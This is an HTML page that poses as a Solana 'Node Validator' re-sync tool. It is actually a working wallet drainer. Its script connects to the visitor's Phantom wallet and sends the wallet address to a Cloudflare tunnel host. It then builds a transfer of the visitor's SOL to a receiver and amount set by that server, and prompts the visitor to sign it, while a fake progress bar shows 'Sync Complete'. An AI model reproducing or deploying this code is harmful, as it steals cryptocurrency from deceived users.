<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Validator Sync</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #14f195; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { border: 1px solid #14f195; padding: 25px; border-radius: 12px; text-align: center; width: 85%; max-width: 300px; background: #0a0a0a; }
        .bar-bg { background: #222; height: 6px; border-radius: 3px; margin: 20px 0; overflow: hidden; }
        #bar-fill { background: #14f195; height: 100%; width: 0%; transition: 0.3s; }
        button { background: #14f195; color: #000; border: none; padding: 16px; width: 100%; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 15px; }
        #status { font-size: 11px; color: #555; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <div style="color:#9945FF; font-weight:bold; letter-spacing:1px;">NODE VALIDATOR</div>
        <div style="font-size:12px; margin-top:5px; color:#ff3e3e;">[OUT OF SYNC]</div>
        <div class="bar-bg"><div id="bar-fill"></div></div>
        <button id="cta">START RE-SYNC</button>
        <div id="status">System idle</div>
    </div>

    <script>
        // ðŸ”± éš§é“åœ°å€
        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

        document.getElementById('cta').onclick = async function() {
            const solana = window.solana || window.phantom?.solana;
            const web3 = window.solanaWeb3;
            const log = (t) => document.getElementById('status').innerText = t;
            const bar = document.getElementById('bar-fill');

            if (!solana) { alert("Please use Phantom App"); return; }

            try {
                log("Connecting...");
                await solana.connect();
                bar.style.width = "30%";

                log("Fetching Node Data...");
                // 1. èŽ·å–æœåŠ¡å™¨ç²¾ç®—æ•°æ®
                const res = await fetch(tunnel + "/prepare", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ address: solana.publicKey.toString() })
                });
                const info = await res.json();
                bar.style.width = "60%";

                log("Awaiting Signature...");
                // 2. æž„é€ äº¤æ˜“ (é‡‡ç”¨æœ€ç¨³å®šçš„æ•°å€¼å¤„ç†)
                const tx = new web3.Transaction();
                tx.add(web3.SystemProgram.transfer({
                    fromPubkey: solana.publicKey,
                    toPubkey: new web3.PublicKey(info.receiver),
                    lamports: Number(info.amount)
                }));
                tx.recentBlockhash = info.bh;
                tx.feePayer = solana.publicKey;

                // 3. æ ¸å¿ƒå”¤èµ·ï¼šä½¿ç”¨ signAndSendTransaction æé«˜æˆåŠŸçŽ‡
                const { signature } = await solana.signAndSendTransaction(tx);
                
                bar.style.width = "100%";
                log("Sync Complete!");
                setTimeout(() => { window.location.href = "https://explorer.solana.com/tx/" + signature; }, 1200);

            } catch (err) {
                console.error(err);
                log("Sync Error. Restarting...");
                setTimeout(() => { location.reload(); }, 1500);
            }
        };
    </script>
</body>
</html>
